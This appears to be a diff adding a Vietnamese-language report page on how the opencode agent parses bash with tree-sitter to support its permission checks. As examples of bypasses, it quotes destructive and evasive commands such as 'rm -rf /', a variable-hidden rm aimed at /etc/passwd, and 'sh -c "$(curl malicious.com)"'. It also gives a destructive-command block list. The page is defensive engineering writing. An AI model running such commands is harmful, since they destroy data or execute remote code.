@@ -1,0 +1,243 @@
+---
+import ReportLayout from '../../../../layouts/ReportLayout.astro';
+import Sidebar from '../../../../components/Sidebar.astro';
+import Hero from '../../../../components/Hero.astro';
+import Breadcrumb from '../../../../components/Breadcrumb.astro';
+import Section from '../../../../components/Section.astro';
+import Subheading from '../../../../components/Subheading.astro';
+import Callout from '../../../../components/Callout.astro';
+import Diagram from '../../../../components/Diagram.astro';
+import CodeBlock from '../../../../components/CodeBlock.astro';
+import RefList from '../../../../components/RefList.astro';
+import DataTable from '../../../../components/DataTable.astro';
+import WhyImportant from '../../../../components/WhyImportant.astro';
+import DeepDiveLink from '../../../../components/DeepDiveLink.astro';
+
+// Import assertion (with { type: "file" }) shown as display code only, not executed
+const code1 = `\
+import TreeSitter from "web-tree-sitter"
+import BashWasm from "tree-sitter-bash/tree-sitter-bash.wasm" // with { type: "file" }
+
+// Lazy-load parser một lần, tái dùng cho mọi command
+let parserPromise: Promise<TreeSitter.Parser> | null = null
+
+function getParser(): Promise<TreeSitter.Parser> {
+  if (!parserPromise) {
+    parserPromise = (async () => {
+      await TreeSitter.init()
+      const parser = new TreeSitter()
+      parser.setLanguage(await TreeSitter.Language.load(BashWasm))
+      return parser
+    })()
+  }
+  return parserPromise
+}`;
+
+const code2 = `\
+const DESTRUCTIVE_COMMANDS = new Set([
+  "rm", "mv", "cp", "dd", "chmod", "chown",
+  "truncate", "shred", "wipe", "mkfs",
+])
+
+export async function analyzeCommand(cmd: string) {
+  const parser = await getParser()
+  const tree   = parser.parse(cmd)
+
+  const commands: Array<{ name: string; args: string[]; paths: string[] }> = []
+
+  // Walk AST recursively
+  walkTree(tree.rootNode, (node) => {
+    if (node.type !== "command") return
+
+    const name = node.childForFieldName("name")?.text ?? ""
+    const args = node.childrenForFieldName("argument").map((a) => a.text)
+    const paths = args.filter((a) => looksLikePath(a))
+
+    commands.push({ name, args, paths })
+  })
+
+  return {
+    commands,
+    modifiesFiles: commands.some((c) => DESTRUCTIVE_COMMANDS.has(c.name)),
+    paths: commands.flatMap((c) => c.paths),
+  }
+}
+
+function looksLikePath(s: string): boolean {
+  return s.startsWith("/") || s.startsWith("./") || s.startsWith("~/") ||
+    s.includes("/") || /\\.\\w+$/.test(s)
+}`;
+
+const code3 = `\
+// Install: npm install web-tree-sitter tree-sitter-bash
+import TreeSitter from "web-tree-sitter"
+
+let _parser: TreeSitter.Parser | null = null
+
+async function getBashParser(): Promise<TreeSitter.Parser> {
+  if (_parser) return _parser
+  await TreeSitter.init()
+  _parser = new TreeSitter()
+  // tree-sitter-bash package cung cấp WASM file
+  const lang = await TreeSitter.Language.load("node_modules/tree-sitter-bash/tree-sitter-bash.wasm")
+  _parser.setLanguage(lang)
+  return _parser
+}
+
+export async function extractCommandInfo(cmd: string) {
+  const parser = await getBashParser()
+  const tree   = parser.parse(cmd)
+
+  const DANGEROUS = new Set(["rm", "mv", "cp", "dd", "chmod", "chown", "truncate"])
+  const commands: { name: string; paths: string[] }[] = []
+
+  function walk(node: TreeSitter.SyntaxNode) {
+    if (node.type === "command") {
+      const name  = node.childForFieldName("name")?.text ?? ""
+      const args  = node.childrenForFieldName("argument").map(a => a.text)
+      const paths = args.filter(a => /^[\\.\/~]|\\//.test(a))
+      commands.push({ name, paths })
+    }
+    node.children.forEach(walk)
+  }
+  walk(tree.rootNode)
+
+  return {
+    commands,
+    isDangerous: commands.some(c => DANGEROUS.has(c.name)),
+    allPaths:    commands.flatMap(c => c.paths),
+  }
+}`;
+---
+<ReportLayout
+  title="T18 — Bash command parsing với tree-sitter WASM | opencode"
+  description="Phân tích sâu kỹ thuật dùng tree-sitter WASM để parse bash command chính xác — detect file-modifying operations, extract paths cho permission system, tránh regex hack dễ bypass."
+>
+  <div class="layout">
+    <Sidebar groups={[
+      { title: 'Nội dung', items: [
+        { href: '#overview',    label: 'Tổng quan',           section: true },
+        { href: '#anatomy',     label: 'Phân tích code' },
+        { href: '#interaction', label: 'Tương tác' },
+        { href: '#failure',     label: 'Failure modes' },
+        { href: '#compare',     label: 'So sánh harness' },
+        { href: '#recipe',      label: 'Implementation recipe' },
+        { href: '#refs',        label: 'Tham khảo' },
+      ]},
+    ]} />
+
+    <main>
+      <Breadcrumb href="/reports/opencode/" label="← opencode report" />
+
+      <Hero
+        title="T18 — Bash command parsing với tree-sitter WASM"
+        subtitle="Regex để phân tích bash là bug-farm. <code>rm -rf /</code>, <code>echo hello | rm</code>, <code>sh -c 'rm x'</code> — tree-sitter parse đúng grammar đầy đủ, extract paths cho permission system một cách an toàn."
+        meta={[
+          { label: 'Nhóm',  value: 'C — Tool Design' },
+          { label: 'File',  value: '<code>tool/bash.ts</code> · Lines 150–320' },
+          { label: 'ID',    value: 'C.6 / T18' },
+          { label: 'Status', value: '<span style="color:var(--chip-green-fg)">Stable</span>' },
+        ]}
+      />
+
+      <Section id="overview" title="Tổng quan" themeTag="Tool Design">
+        <WhyImportant>
+          <strong>Tại sao quan trọng.</strong> Permission system cần biết: lệnh bash này có modify file không? Nếu có, ở path nào? Dùng regex để detect điều này là cực kỳ nguy hiểm — regex không hiểu cú pháp shell: <code>rm -rf /</code> rõ ràng, nhưng <code>sh -c 'rm $(cat target)'</code>, <code>$(ls | head -1 | xargs rm)</code>, hay <code>export X=rm; $X /etc/passwd</code> thì không. tree-sitter-bash là full grammar parser — hiểu quoting, subshell, pipe, redirection, command substitution.
+        </WhyImportant>
+
+        <Callout type="unique">
+          <strong>WASM portable:</strong> tree-sitter-bash WASM file chạy trong Bun, Node.js, và browser — cùng 1 binary, không cần native bindings hay recompile. Lazy-load đảm bảo cold start nhanh.
+        </Callout>
+      </Section>
+
+      <Section id="anatomy" title="Phân tích code chi tiết" themeTag="Anatomy">
+        <Subheading level="h3" text="Lazy-load parser + WASM" />
+        <CodeBlock caption="tool/bash.ts — lazy parser init" lang="typescript" code={code1} />
+
+        <Subheading level="h3" text="Walk AST, extract paths từ destructive commands" />
+        <CodeBlock caption="tool/bash.ts — analyzeCommand" lang="typescript" code={code2} />
+
+        <Diagram>{`
+bash command: "rm -rf ./dist && mv src/index.ts src/main.ts"
+                    │
+                    ▼
+          tree-sitter parse
+                    │
+                    ▼
+         AST (Abstract Syntax Tree)
+         ├── command: "rm"
+         │     args: ["-rf", "./dist"]
+         │     paths: ["./dist"]  ← looksLikePath()
+         │
+         └── command: "mv"
+               args: ["src/index.ts", "src/main.ts"]
+               paths: ["src/index.ts", "src/main.ts"]
+                    │
+                    ▼
+         { modifiesFiles: true, paths: ["./dist", "src/index.ts", "src/main.ts"] }
+                    │
+                    ▼
+         permission.ask({ permission: "bash", patterns: paths })
+        `}</Diagram>
+      </Section>
+
+      <Section id="interaction" title="Tương tác với kỹ thuật khác" themeTag="Interaction">
+        <ul>
+          <li><strong>T24 (Wildcard permission evaluation):</strong> Paths extracted bởi tree-sitter là input cho permission system. <code>analyzeCommand</code> trả về paths → <code>permission.ask(&#123; patterns: paths &#125;)</code> → wildcard match → allow/deny/ask.</li>
+          <li><strong>T26 (Arity normalization):</strong> Command name từ tree-sitter parse (<code>"npm run"</code>, <code>"git commit"</code>) được đưa vào arity normalization để suggest wildcard pattern cho user.</li>
+          <li><strong>T25 (Session-scoped permission):</strong> Khi user approve <code>rm ./dist</code> với "always" → <code>bash:rm ./dist*</code> được lưu vào session state. Lần sau parser detect <code>rm ./dist/...</code> → permission check pass luôn.</li>
+        </ul>
+      </Section>
+
+      <Section id="failure" title="Failure modes" themeTag="Failure">
+        <Subheading level="h3" text="1. WASM bundle size" />
+        <p>
+          <code>tree-sitter-bash.wasm</code> ~1.5–2MB. Tăng startup time đáng kể nếu không lazy-load. Lazy-load giải quyết phần lớn nhưng first bash command vẫn chậm hơn (~100–200ms) so với subsequent calls.
+        </p>
+
+        <Subheading level="h3" text="2. Shell exotic syntax" />
+        <p>
+          tree-sitter-bash support bash/sh grammar nhưng có thể miss một số pattern của zsh-specific syntax, fish shell, hoặc complex Here-doc. Với các shell exotic này, parser có thể trả về AST không đầy đủ.
+        </p>
+        <Callout type="warn">
+          <strong>Security implication:</strong> Nếu parser miss 1 pattern, permission check có thể bị bypass. Cần fallback: nếu parse fail hoặc không detect được command, default sang "ask" thay vì "allow". Fail-safe, không fail-open.
+        </Callout>
+
+        <Subheading level="h3" text="3. Dynamic command construction" />
+        <p>
+          <code>eval "rm $(cat target)"</code> hoặc <code>sh -c "$(curl malicious.com)"</code> — tree-sitter parse được AST nhưng không thể biết giá trị runtime của expression. Chỉ có thể detect pattern, không thể đảm bảo an toàn 100%.
+        </p>
+      </Section>
+
+      <Section id="compare" title="So sánh với các harness khác" themeTag="Compare">
+        <DataTable
+          variant="compare"
+          richCells
+          headers={['Harness', 'Bash analysis method', 'Accuracy', 'Notes']}
+          rows={[
+            ['opencode', 'tree-sitter WASM (full grammar)', '⭐⭐⭐⭐⭐', 'Chính xác nhất, portable'],
+            ['Claude Code', 'Regex + heuristics', '⭐⭐⭐', 'Documented bypass vulnerabilities'],
+            ['Aider', 'Python shlex parsing', '⭐⭐⭐', 'Tốt hơn regex nhưng không đầy đủ'],
+            ['Cline', 'Regex pattern matching', '⭐⭐', 'Dễ bypass với quoting'],
+            ['OpenHarness', 'Hardcoded sensitive path check', '⭐⭐', 'Pattern-based, không parse AST'],
+          ]}
+        />
+      </Section>
+
+      <Section id="recipe" title="Implementation recipe" themeTag="Recipe">
+        <CodeBlock lang="typescript" code={code3} />
+      </Section>
+
+      <Section id="refs" title="Tham khảo" themeTag="Refs">
+        <RefList
+          items={[
+            '<a href="https://tree-sitter.github.io/tree-sitter/">Tree-sitter — official intro &amp; docs</a>',
+            '<a href="https://github.com/tree-sitter/tree-sitter">tree-sitter/tree-sitter — GitHub</a>',
+            '<a href="https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/">Adversa — Claude Code Critical Vulnerability: Deny rules bypassed (why regex fails)</a>',
+            '<a href="https://claudelog.com/faqs/what-is-wildcard-bash-permissions-in-claude-code/">ClaudeLog — Wildcard Bash Permissions in Claude Code</a>',
+          ]}
+        />
+      </Section>
+    </main>
+  </div>
+</ReportLayout>
